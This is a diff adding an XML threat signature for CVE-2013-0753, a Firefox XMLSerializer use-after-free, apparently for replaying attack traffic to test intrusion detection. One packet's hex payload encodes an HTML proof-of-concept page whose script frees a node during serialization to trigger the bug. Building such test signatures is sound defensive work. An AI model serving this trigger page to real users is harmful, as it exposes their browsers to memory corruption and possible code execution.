@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Mozilla Firefox XMLSerializer Use After Free"/>
+    <EngDesc display="true" value="A code execution vulnerability exists in Mozilla Firefox. The vulnerability is caused by a use-after-free error when processing script code making use of the XMLSerializer function. A remote attacker could exploit this vulnerability by enticing the target user to open a malicious web page. In the case of successful exploitation, arbitrary attacker code would be executed in the security context of the target user."/>
+    <Intent display="true">
+      <item value="MEMORY_CORRUPTION"/>
+    </Intent>
+    <Protocol display="true" value="HTTP,HTTPS,SMTP,IMAP,POP3"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="High"/>
+    <Known_Vendors_Affected display="true">
+      <item value="Mozilla_Foundation"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Firefox"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="prior_to_18.0"/>
+      <item value="prior_to_ESR_10.0.12"/>
+      <item value="prior_to_ESR_17.0.2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20130108-18"/>
+    <CVEID display="true" value="CVE-2013-0753"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="89021"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="d69eee821982b5d45ef3a002e4f23197"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="MEDIUM"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635349875422856921"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1399368630" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="B">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:50:56:B4:03:14" destMac="00:1B:78:75:79:68" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="014B" Identification="0ACB" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="8CCC" srcIP="172.16.8.243" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="1318" destPort="$HTTPdestPort" SeqNumber="9404B2B8" AckNumber="959DEBBD" HeaderLength="05" WindowSize="FAF0" Checksum="55F8" UrgentPointer="0000" Options="" Payload="474554202F7E6A7869612F706F632E68746D6C20485454502F312E310D0A486F73743A203137322E31362E312E320D0A557365722D4167656E743A204D6F7A696C6C612F352E30202857696E646F7773204E5420352E313B2072763A31372E3029204765636B6F2F32303130303130312046697265666F782F31372E300D0A4163636570743A20746578742F68746D6C2C6170706C69636174696F6E2F7868746D6C2B786D6C2C6170706C69636174696F6E2F786D6C3B713D302E392C2A2F2A3B713D302E380D0A4163636570742D4C616E67756167653A20656E2D55532C656E3B713D302E350D0A4163636570742D456E636F64696E673A20677A69702C206465666C6174650D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:50:56:B4:03:14" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="04A9" Identification="BB10" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="1929" srcIP="$destIP" destIP="172.16.8.243" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$HTTPdestPort" destPort="1318" SeqNumber="959DEBBD" AckNumber="9404B3DB" HeaderLength="05" WindowSize="1920" Checksum="14C1" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205468752C203033204F637420323031332031353A35333A323520474D540D0A5365727665723A204170616368652F322E322E33202843656E744F5329205048502F352E312E36206D6F645F707974686F6E2F332E322E3820507974686F6E2F322E342E33206D6F645F7065726C2F322E302E34205065726C2F76352E382E380D0A4C6173742D4D6F6469666965643A205468752C203033204F637420323031332031353A35303A333620474D540D0A455461673A2022333862383032342D3330352D34653764383235393032623030220D0A4163636570742D52616E6765733A2062797465730D0A436F6E74656E742D4C656E6774683A203737330D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D49534F2D383835392D310D0A0D0A3C68746D6C3E0A3C7469746C653E54656C7573205365637572697479204C616220506F6320666F72204356452D323031332D303735333C2F7469746C653E0A3C7363726970743E0A66756E6374696F6E20736C656570286D696C6C697365636F6E647329207B0A2020766172207374617274203D206E6577204461746528292E67657454696D6528293B0A2020666F7220287661722069203D20303B2069203C2031653130303B20692B2B29207B0A2020202069662028286E6577204461746528292E67657454696D652829202D20737461727429203E206D696C6C697365636F6E6473297B0A202020202020627265616B3B0A202020207D0A20207D0A7D0A0A66756E6374696F6E20706F632829207B0A202076617220747874203D20274141414141414141414141414141414141414141414141414141414141414141273B0A20207768696C6520287478742E6C656E677468203C3D2031303030290A20202020747874202B3D207478743B0A0A202076617220706172203D20646F63756D656E742E676574456C656D656E7442794964282270617222293B0A202076617220636864203D20646F63756D656E742E676574456C656D656E7442794964282263686422293B0A0A20206368642E736574417474726962757465282274736C222C20747874293B0A0A202076617220786D6C203D206E657720584D4C53657269616C697A657228293B0A20207661722073747265616D203D207B0A2020202077726974653A2066756E6374696F6E2829207B0A2020202020207061722E72656D6F76654368696C6428636864293B0A202020202020636864203D206E756C6C3B0A202020202020736C656570283135303030293B0A202020207D0A20207D3B0A0A2020786D6C2E73657269616C697A65546F53747265616D287061722C2073747265616D2C202222293B0A7D0A3C2F7363726970743E0A3C626F6479206F6E6C6F61643D22706F6328293B223E0A3C6469762069643D22706172223E0A3C6469762069643D22636864222F3E0A3C2F6469763E0A3C2F626F64793E0A3C2F68746D6C3E0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
